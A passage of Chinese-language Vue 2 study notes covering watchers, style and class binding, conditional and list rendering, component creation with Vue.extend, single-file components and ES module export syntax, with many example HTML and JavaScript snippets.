	immediate:true, //初始化时让handler调用一下
	deep:true,//深度监视
	handler(newValue,oldValue){
		console.log('isHot被修改了',newValue,oldValue)
	}
}) */
//简写
/* vm.$watch('isHot',(newValue,oldValue){
	console.log('isHot被修改了',newValue,oldValue,this)
}) */
```

computed和watch之间的区别：
			1.computed能完成的功能，watch都可以完成。
			2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。如下示例
	两个重要的小原则：
				1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
				2.**所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
					这样this的指向才是vm 或 组件实例对象。**

```js
const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				fullName:'张-三'
			},
			watch:{
				firstName(val){
					setTimeout(()=>{
						console.log(this)
						this.fullName = val + '-' + this.lastName
					},1000);
				},
				lastName(val){
					this.fullName = this.firstName + '-' + val
				}
			}
		})
```

### 绑定样式

在Vue.js中，可以通过`v-bind:class`和`v-bind:style`指令来动态地绑定样式到元素上。

1. **动态绑定class**：
   - 使用`v-bind:class`指令可以动态地绑定一个或多个class到元素上。
   - 可以直接绑定一个对象，对象的 key 是 class 名称，value 是一个布尔值，为`true`时表示添加该class，为`false`时表示移除该class。
   - 也可以绑定一个返回对象的计算属性。
   
   示例：
   ```html
   <div v-bind:class="{ active: isActive, 'text-danger': hasError }"></div>
   ```
   
2. **动态绑定style**：
   - 使用`v-bind:style`指令可以动态地绑定内联样式到元素上。
   - 可以直接绑定一个对象，对象的 key 是 CSS 属性名称，value 是对应的值。
   - 也可以绑定一个返回对象的计算属性。
   
   示例：
   ```html
   <div v-bind:style="{ color: textColor, fontSize: fontSize + 'px' }"></div>
   ```
3. **数组语法**：
   - 在`v-bind:class`和`v-bind:style`中也可以使用数组语法，用于动态地切换多个样式。
   
   示例：
   ```html
   <div v-bind:class="[activeClass, errorClass]"></div>
   ```

```
1. class样式
				写法:class="xxx" xxx可以是字符串、对象、数组。
						字符串写法适用于：类名不确定，要动态获取。
						对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
						数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
	2. style样式
				:style="{fontSize: xxx}"其中xxx是动态值。
				:style="[a,b]"其中a、b是样式对象。
```

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				},
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```

### 条件渲染（if-else）

在Vue.js中，可以通过`v-if`、`v-else-if`、`v-else`、`v-show`等指令来实现条件渲染，根据表达式的真假来决定是否渲染或显示特定的元素。
1. **v-if**：
   - `v-if`指令根据表达式的真假来决定是否渲染元素。
   
   示例：
   ```html
   <div v-if="isTrue">条件为真时显示的内容</div>
   ```
2. **v-else-if**：
   - `v-else-if`指令用于在多个条件之间切换，前一个条件为假时，判断下一个条件是否为真。
   
   示例：
   ```html
   <div v-if="condition1">条件1为真时显示的内容</div>
   <div v-else-if="condition2">条件2为真时显示的内容</div>
   ```
3. **v-else**：
   - `v-else`指令用于在`v-if`之后使用，表示如果前面的条件都不满足，则显示`v-else`指定的内容。
   
   示例：
   ```html
   <div v-if="condition1">条件1为真时显示的内容</div>
   <div v-else>条件1为假时显示的内容</div>
   ```
4. **v-show**：
   - `v-show`指令根据表达式的真假来决定是否显示元素，**但是始终会渲染元素到DOM中，只是通过CSS的`display`属性来控制显示或隐藏**。
   
   示例：
   ```html
   <div v-show="isShow">根据条件显示或隐藏的内容</div>
   ```
   通过条件渲染，我们可以根据数据的变化动态地显示或隐藏特定的元素，实现页面内容的动态展示效果。

```
条件渲染：
	1.v-if
				写法：
						(1).v-if="表达式" 
						(2).v-else-if="表达式"
						(3).v-else="表达式"
				适用于：切换频率较低的场景。
				特点：不展示的DOM元素直接被移除。
				注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
	2.v-show
				写法：v-show="表达式"
				适用于：切换频率较高的场景。
				特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
		
	3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
```

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```

在Vue.js中，`v-if`指令通常用于条件性地渲染元素，但有时候我们希望根据条件渲染多个元素，这时可以结合`<template>`标签来实现。
使用`<template>`标签可以在不影响最终渲染结果的情况下包裹多个元素，起到一个容器的作用，不会在最终的DOM中留下额外的标记。结合`v-if`指令，我们可以根据条件在`<template>`中包裹多个元素，并根据条件选择性地渲染这些元素。但`<template>`不可与`v-show`配合使用。
示例代码如下：
```html
<template v-if="condition">
  <p>条件为真时显示的内容1</p>
  <p>条件为真时显示的内容2</p>
</template>
```
在上面的示例中，如果`condition`为真，则会渲染`<template>`标签内的两个`<p>`元素，如果`condition`为假，则不会在最终的DOM中渲染这两个`<p>`元素。
使用`<template>`标签配合`v-if`指令可以更加灵活地控制多个元素的条件渲染，同时不会在最终的DOM中留下多余的标记，保持页面结构的清晰和简洁。

### 列表渲染（list）

在Vue.js中，可以使用`v-for`指令来进行列表渲染，即根据数组或对象的数据来动态地渲染多个元素。
1. **数组渲染**：
   - 使用`v-for`指令可以遍历数组的每个元素，并根据数组中的数据动态地渲染元素。
   
   示例：
   ```html
   <ul>
     <li v-for="item in items" :key="item.id">{{ item.name }}</li>
   </ul>
   ```
2. **对象渲染**：
   - 除了数组，`v-for`指令也可以遍历对象的属性，并根据对象的数据动态地渲染元素。
   
   示例：
   ```html
   <ul>
     <li v-for="(value, key) in object" :key="key">{{ key }}: {{ value }}</li>
   </ul>
   ```
3. **遍历整数**：
   - 可以使用`v-for`指令来遍历整数，用于生成一定数量的元素。
   
   示例：
   ```html
   <ul>
     <li v-for="n in 10" :key="n">第{{ n }}个元素</li>
   </ul>
   ```
4. **遍历数组索引**：
   - 除了遍历数组的元素，还可以遍历数组的索引。
   
   示例：
   ```html
   <ul>
     <li v-for="(item, index) in items" :key="index">索引{{ index }}: {{ item }}</li>
   </ul>
   ```
   通过列表渲染，我们可以根据数组或对象中的数据动态生成多个元素，实现列表展示、循环渲染等功能。

#### v-for

```
v-for指令:
	1.用于展示列表数据
	2.语法：v-for="(item, index) in xxx" :key="yyy"
	3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
```

```html
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
```

#### 遍历中的 key

```html
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<button @click.once="add">添加一个老刘</button>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老刘',age:40}
						this.persons.unshift(p)
					}
				},
			})
		</script>
```

在默认情况下，使用 v-for 渲染列表时，不指定 key 会默认使用数据的 index 属性作为 key

先填写input框的信息，再点击添加信息，发现信息错乱

解决方法：使用数据唯一标识来替换 key

[API — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/api/#key)

```
面试题：react、vue中的 key 有什么作用？（key的内部原理）
	
	1. 虚拟 DOM 中 key 的作用：
					key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
					随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
					
	2.对比规则：
				(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
							①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
							②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
				(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
							创建新的真实DOM，随后渲染到到页面。
							
	3. 用index作为key可能会引发的问题：
						1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
										会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
						2. 如果结构中还包含输入类的DOM：
										会产生错误DOM更新 ==> 界面有问题。
	4. 开发中如何选择key?:
						1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
						2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
							使用index作为key是没有问题的。
```

#### 列表选择性渲染

```html
<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			
			//用computed实现
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						return this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
```

#### 列表排序

```html
<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
```

#### 渲染列表时修改数据不生效问题

先看一个示例

```html
<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<button @click="updateMei">更新马冬梅的信息</button>
			<ul>
				<li v-for="(p,index) of persons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			const vm = new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				methods: {
					updateMei(){
						// this.persons[0].name = '马老师' //奏效
						// this.persons[0].age = 50 //奏效
						// this.persons[0].sex = '男' //奏效
						// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
						this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
					}
				}
			}) 

		</script>
```

上述代码中 `this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'}` 并没有生效

解决方法

[列表渲染 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/list.html#数组更新检测)

在Vue.js中，当使用`v-for`指令渲染列表时，如果修改了列表数据但没有触发Vue的响应式更新，可能导致页面上的数据不会更新。这通常是由于Vue对响应式数据的检测机制导致的。
解决这个问题的方法有以下几种：
1. **数组变异方法**：
   - 如果你使用的是数组来进行列表渲染，**确保使用Vue识别的数组变异方法来修改数组**，比如`push()`、`pop()`、`shift()`、`unshift()`、`splice()`、`sort()`、`reverse()`等。这样Vue会监听到数组的变化并更新视图。
2. **对象属性新增**：
   - 如果你使用的是对象来进行列表渲染，确保新增属性时使用`Vue.set(object, key, value)`或`this.$set(object, key, value)`方法来添加新属性。这样Vue会监听到对象的变化并更新视图。
3. **响应式数据更新**：
   - 确保修改数据时，使用Vue提供的响应式数据更新方法，比如`this.$set()`、`this.$delete()`等，而不是直接赋值。这样Vue能够正确地追踪数据的变化并更新视图。
4. **强制更新**：
   - 如果以上方法都无效，你可以尝试使用`this.$forceUpdate()`方法来强制更新组件。但这不是推荐的做法，因为Vue通常能够自动检测到数据的变化并更新视图。
5. **使用计算属性**：
   - 如果是对列表数据进行某种计算或过滤，可以考虑使用计算属性来处理数据，确保计算属性会随着依赖数据的变化而重新计算。
   如果你遇到了在使用`v-for`渲染列表时修改数据不生效的问题，可以尝试以上方法来解决。通常情况下，遵循Vue的响应式数据更新规则，使用Vue提供的方法来修改数据，就能够保证页面正确地更新。

## 组件


### 非单文件组件

在Vue.js中，非单文件组件指的是直接在JavaScript代码中定义Vue组件的方式，而不是使用单文件组件（.vue文件）的形式。非单文件组件通常将组件的模板、脚本和样式都写在同一个JavaScript对象中，这种方式适用于一些简单的组件或者小型项目。

以下是一个简单的非单文件组件的示例：

```javascript
Vue.component('my-component', {
    template: `
        <div>
            <h1>{{ title }}</h1>
            <p>{{ content }}</p>
        </div>
    `,
    data() {
        return {
            title: 'Hello Vue!',
            content: 'This is a Vue component.'
        };
    }
});
```

在这个示例中，我们直接在`Vue.component`方法的第二个参数中定义了一个对象，包含了组件的模板内容（`template`）、数据（`data`）等。这种方式适合于简单的组件，可以在一个文件中直接定义组件的结构和逻辑，便于快速开发和调试。
非单文件组件的优点包括：

1. **简单快捷**：不需要额外的构建步骤，可以直接在JavaScript中编写组件。
2. **适用于小型项目**：对于一些小型项目或者简单的组件，非单文件组件是一种轻量级的组织方式。
3. **学习曲线低**：对于刚开始学习Vue.js的开发者来说，非单文件组件可以更直观地理解组件的结构和使用方式。

然而，随着项目规模的增大和复杂度的提高，使用单文件组件的方式会更加方便管理和维护。单文件组件将模板、脚本和样式分离，使得代码更具可读性和可维护性，同时也支持更丰富的功能，如预处理器、作用域样式等。因此，在大型项目中，推荐使用单文件组件来组织Vue.js应用程序。

#### 1 创建组件

##### Vue.extend (vue 3 已废弃)

在Vue.js中，`Vue.extend`是用来创建Vue构造器的方法。通过`Vue.extend`方法，可以基于现有的Vue实例创建一个新的Vue构造器，从而可以动态地扩展和创建新的Vue组件。

下面是一个简单的示例，演示了如何使用`Vue.extend`方法创建一个新的Vue构造器：

```javascript
// 创建一个基础的Vue构造器
var MyBaseComponent = Vue.extend({
    template: '<div>{{ message }}</div>',
    data() {
        return {
            message: 'Hello from MyBaseComponent!'
        };
    }
});
// 使用新的Vue构造器创建一个实例
var myComponentInstance = new MyBaseComponent();
myComponentInstance.$mount('#app');
```

在这个示例中，我们首先使用`Vue.extend`方法基于`MyBaseComponent`创建了一个新的Vue构造器，然后通过这个构造器创建了一个新的Vue实例`myComponentInstance`，并将其挂载到`#app`元素上。这样就动态地创建了一个新的Vue组件。

`Vue.extend`方法的主要作用包括：
1. **创建Vue构造器**：通过`Vue.extend`方法可以创建一个新的Vue构造器，这个构造器可以用来生成新的Vue组件实例。
2. **继承现有组件**：基于现有的Vue实例或组件，可以通过`Vue.extend`方法创建一个新的Vue构造器，实现组件的继承和扩展。
3. **动态组件生成**：在某些情况下，需要动态地根据不同的需求创建不同的Vue组件，这时可以使用`Vue.extend`方法来动态生成新的Vue构造器和组件实例。

需要注意的是，使用`Vue.extend`方法创建的新的Vue构造器是可以继续扩展和定制的，可以在新的构造器中添加新的数据、方法等，实现更复杂的组件逻辑。通过灵活运用`Vue.extend`方法，可以更加高效地管理和创建Vue组件。

示例

```js
//创建school组件
const school = Vue.extend({
    name:'school', // 开发者工具中的显示名称,可选填
	template:`
		<div class="demo">
			<h2>学校名称：{{schoolName}}</h2>
			<h2>学校地址：{{address}}</h2>
			<button @click="showName">点我提示学校名</button>	
		</div>
	`,
	// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
	data(){
		return {
			schoolName:'尚硅谷',
			address:'北京昌平'
		}
	},
	methods: {
		showName(){
			alert(this.schoolName)
		}
	},
})
```

```
一个简写方式： const school = Vue.extend(options) 可简写为：const school = options
```

#### 2 注册组件

##### 全局注册组件

```js
Vue.component('school',school)
```

##### 局部注册组件

```js
new Vue({
	el:'#root',
	data:{
		msg:'你好啊！'
	},
	//注册组件（局部注册）
	components:{
		school:school, // 组件名:组件句柄
		student
	}
})
```

```
关于组件名:
	一个单词组成：
				第一种写法(首字母小写)：school
				第二种写法(首字母大写)：School
	多个单词组成：
				第一种写法(kebab-case命名)：my-school
				第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
	备注：
			(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
			(2).可以使用name配置项指定组件在开发者工具中呈现的名字。
```

#### 3 使用组件

```html
<div id="root">
	<school></school>
</div>
```

```
关于组件标签:
	第一种写法：<school></school>
	第二种写法：<school/>
	备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
```

#### 总结

```
Vue中使用组件的三大步骤：
			一、定义组件(创建组件)
			二、注册组件
			三、使用组件(写组件标签)
	一、如何定义一个组件？
				使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
				区别如下：
						1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
						2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
				备注：使用template可以配置组件结构。
	二、如何注册组件？
					1.局部注册：靠new Vue的时候传入components选项
					2.全局注册：靠Vue.component('组件名',组件)
	三、编写组件标签：
					<school></school>
```

#### 示例

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName)
				}
			},
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			}
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//第二步：全局注册组件
		Vue.component('hello',hello)

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,
				student
			}
		})

		new Vue({
			el:'#root2',
		})
	</script>
</html>
```

#### 组件的嵌套

在组件中可以嵌套注册使用其他组件，在模板中可以一并解析

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>组件的嵌套</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//定义student组件
		const student = Vue.extend({
			name:'student', // 开发者工具中的显示名称
			template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					age:18
				}
			}
		})
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			//注册组件（局部）
			components:{
				student
			}
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`<h1>{{msg}}</h1>`,
			data(){
				return {
					msg:'欢迎来到尚硅谷学习！'
				}
			}
		})
		
		//定义app组件
		const app = Vue.extend({
			template:`
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
			components:{
				school,
				hello
			}
		})

		//创建vm
		new Vue({
			template:'<app></app>',
			el:'#root',
			//注册组件（局部）
			components:{app}
		})
	</script>
</html>
```

#### 关于组件

1. school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

![image-20240315175535282](https://raw.githubusercontent.com/MrSunflowers/images/main/note/images/202403151755428.png)

2. 我们只需要写`<school/>`或`<school></school>`，Vue解析时会帮我们创建school组件的实例对象，
	即Vue帮我们执行的：`new VueComponent(options)`。
3. 特别注意：**每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！**
4. 关于this指向：
		(1).组件配置中：
					data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
		(2).new Vue(options)配置中：
					data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
	Vue的实例对象，以后简称vm。

![image-20240318143101706](https://raw.githubusercontent.com/MrSunflowers/images/main/note/images/202403181431844.png)

#### 关于原型对象

```js
//1. 定义一个构造函数
function Demo(){
	this.a = 1
	this.b = 2
}
//2. new 一个Demo的实例对象
const d = new Demo()

console.log(Demo.prototype) // Demo.prototype 为显示原型属性
console.log(d.__proto__) // d.__proto__ 为隐式原型属性
console.log(Demo.prototype === d.__proto__) // ture 而 显示原型属性 与 隐式原型属性 相同
// 所以程序员可以通过显示原型属性操作原型对象，例如在 显示原型属性上 追加一个x属性，值为99，则在 隐式原型属性 上也可以访问，这样即可实现通过 隐式原型属性 来操控 对象实例的 隐式原型属性
Demo.prototype.x = 99
console.log('@',d.__proto__.x) // 99
console.log('@',d.x) // 也可以这样访问
```

此种设计模式同样在vue中有所体现，就表现在一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`，为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

即 VueComponent 实例继承了 Vue ，在 Vue.prototype 中定义的属性，都可以在 VueComponent 实例中使用

### 单文件组件

#### vue 文件命名规范

1. 纯小写 test.vue
2. 首字母大写 Test.vue (推荐)
3. 多单词命名1 my-test.vue
4. 多单词命名2 MyTest.vue (推荐)

#### 文件结构

```vue
<template>
	// 组件结构
</template>

<script>
	// 组件交互代码
</script>

<style>
	// 组件样式
</style>
```

这里需要注意的是，因为组件是给其他功能引用的，所以需要将模块导出出去，即会用到 es 6 的导出语法  

示例

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export const school = Vue.extend({
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	})
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

#### 导出模块

其中 script 中的脚本可以有三种导出方式

##### 1. 命名导出（Named Exports）：
使用`export`关键字可以将变量、函数、类等内容进行命名导出，其他模块可以通过名称引入这些导出的内容。示例如下：
```javascript
// 导出变量
export const name = 'Alice';
export const age = 30;
// 导出函数
export function greet() {
    return `Hello, ${name}!`;
}
// 导出类
export class Person {
    constructor(name, age) {
        this.name = name;
        this.age = age;
    }
}
```
其他模块可以通过以下方式引入命名导出的内容：
```javascript
import { name, age, greet, Person } from './myModule';
```
##### 2. 默认导出（Default Export）：
使用`export default`关键字可以将模块中的内容设定为默认导出，一个模块只能有一个默认导出。示例如下：
```javascript
// 默认导出一个函数
export default function sayHello(name) {
    return `Hello, ${name}!`;
}
```
其他模块可以通过以下方式引入默认导出的内容：
```javascript
import sayHello from './myModule';
```
##### 3. 统一导出（Exporting All in One）：
使用`export *`关键字可以将一个模块中的所有内容统一导出，其他模块可以一次性引入所有导出的内容。示例如下：
```javascript
// 导出所有内容
export * from './myModule';
```
其他模块可以通过以下方式一次性引入所有导出的内容：
```javascript
import * as myModule from './myModule';
```
##### 4. 导出时重命名：
在导出时，可以使用`as`关键字对导出的内容进行重命名，方便在引入时使用不同的名称。示例如下：
```javascript
